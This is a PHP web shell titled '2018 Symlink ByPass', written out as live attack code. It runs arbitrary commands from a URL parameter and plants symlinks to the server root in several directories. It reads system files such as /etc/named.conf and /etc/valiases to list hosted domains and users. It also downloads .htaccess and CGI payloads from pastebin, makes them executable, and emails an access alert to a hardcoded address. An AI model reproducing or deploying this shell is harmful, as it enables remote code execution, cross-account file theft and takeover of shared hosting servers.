...
<head>
<meta charset="utf-8">
<title>2018 Symlink ByPass</title>
<style>
body{
...
<center> <img src="https://vignette.wikia.nocookie.net/universosteven/images/2/27/Anonymous_logo_by_viperaviator-d4bwqvn.png/revision/latest?cb=20150724052459&path-prefix=es" alt="ICA" width="200" height="200"></a>
<center><h1><a>2018 Symlink ByPass</center></h1></a>
<center><h3><a href="?OPT=3">Symlink</a></h3></center>


<?php error_reporting(0);
 ob_start();
 passthru($_GET['symlink']);
 ...
 @mkdir($dir);
 if($dir){ } else { } $dir2 = "sec2";
 @mkdir($dir2);
 if($dir2){ } else { } $dir3 = "sec3";
 @mkdir($dir3);
 if($dir3){ } else { } $dir4 = "sec4";
 @mkdir($dir4);
 if($dir4){ } else { } $dir5 = "sec5";
 @mkdir($dir5);
 if($dir5){ } else { } $dir6 = "sec6";
 @mkdir($dir6);
 if($dir6){ } else { } $dir7 = "sec7";
 @mkdir($dir7);
 if($dir7){ } else { } function mail_alert() { global $email, $your_ip;
...
By Indrajith";
 mail($email, "Shell Accessed!!!", $content_mail ,"From:fighterkamrul562@gmail.com");
 } $sec1 = "sec1/.htaccess";
...
Options All";
 ...
 for ($k=1;
$k<8;
$k++){ if("$fp$k"){ chdir('sec'.$k);
 system('ln -s / 1.txt');
 chdir('../');
 } else{ echo "Error";
 } } if(isset($_REQUEST['OPT'])) { switch ($_REQUEST['OPT']) { case '1';
 echo "<center><table border='1' align='center' width='80%'><h3><td><a>Domains</td></a><td><a>User</a></td><td><a>Sym</a></td></h3></center>";
 if(!is_file('DATA.txt')){ $named = @file("/etc/named.conf");
 }else{ $named = @file("DATA.txt");
 } if(!$named) { die ("</br></br><center><h2><a>ERROR !</a></h2></center>");
 } else { foreach($named as $dom){ preg_match_all('#zone "(.*)"#', $dom, $doms);
 if(strlen(trim($doms[1][0])) > 2){ $user = posix_getpwuid(@fileowner("/etc/valiases/".$doms[1][0]));
 ...
 if(!$file) { die ("</br></br><center><h2><a>ERROR !</a></h2></center>");
 } else { foreach ($file as $f){ $u=explode(':', $f);
 $user = $u['0'];
 ...
 $dir = 'SYM';
 @mkdir($dir);
 if($dir){ echo '<br> SYM Has Been Created ~';
 } else { echo '<br> [-] Error !';
 } $htaccess = 'http://pastebin.com/raw.php?i=XBLhdvbQ';
 $file = file_get_contents($htaccess);
 $open = fopen('SYM/.htaccess' , 'w');
 fwrite($open,$file);
 fclose($open);
 if($open) { echo '<br> [htaccess] => Has Been Created ~';
 } else { echo "<br>[+] Error !";
 } $con = 'http://pastebin.com/raw.php?i=sk8JEgq0';
 $file = file_get_contents($con);
 $open = fopen('SYM/con.cpc' , 'w');
 fwrite($open,$file);
 fclose($open);
 if($open) { echo '<br> [cgi] => Has Been Created !';
 } else { echo '<br>[-] Error !';
 } $ch = 'SYM/con.cpc';
 chmod($ch, 0755);
 if($cgip){ echo '<br>[+] => CHMOD To 755 Complate ~';
...
";
 ...
 $temp = trim($temp);
 $file5 = fopen("SYMTMP.txt","w");
 fputs($file5,$temp);
 fclose($file5);
 $file = fopen("SYMTMP.txt", "r") or exit("Unable to open file!");
...
AddHandler txt .php';
 ...
 echo "</br>";
 echo "<center>2018 Symlink ByPass</center>";
 } 
?>